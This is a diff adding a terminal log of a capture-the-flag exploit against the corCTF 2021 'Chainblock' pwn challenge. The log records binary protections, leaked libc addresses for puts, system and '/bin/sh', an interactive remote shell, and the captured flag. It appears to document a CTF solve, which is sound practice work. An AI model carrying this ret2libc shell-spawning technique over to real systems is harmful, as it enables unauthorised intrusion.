@@ -1,0 +1,31 @@
+mito@ubuntu:~/CTF/corCTF_2021/Pwn_Chainblock$ python3 solve.py r
+[*] '/home/mito/CTF/corCTF_2021/Pwn_Chainblock/chainblock'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3ff000)
+    RUNPATH:  b'./'
+[+] Opening connection to pwn.be.ax on port 5000: Done
+[*] '/home/mito/CTF/corCTF_2021/Pwn_Chainblock/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7f25db2559d0
+libc_base   = 0x7f25db1d5000
+system_addr = 0x7f25db224a60
+binsh_addr  = 0x7f25db380f05
+[*] Switching to interactive mode
+KYC failed, wrong identity!
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 2180
+-rw-rw-r-- 1 nobody nogroup      40 Aug 12 19:07 flag.txt
+-rwxrwxr-x 1 nobody nogroup  216192 Aug 12 19:07 ld-linux-x86-64.so.2
+-rwxrwxr-x 1 nobody nogroup 1983576 Aug 12 19:07 libc.so.6
+-rwxrwxr-x 1 nobody nogroup   20488 Aug 14 20:42 run
+$ cat flag.txt
+corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
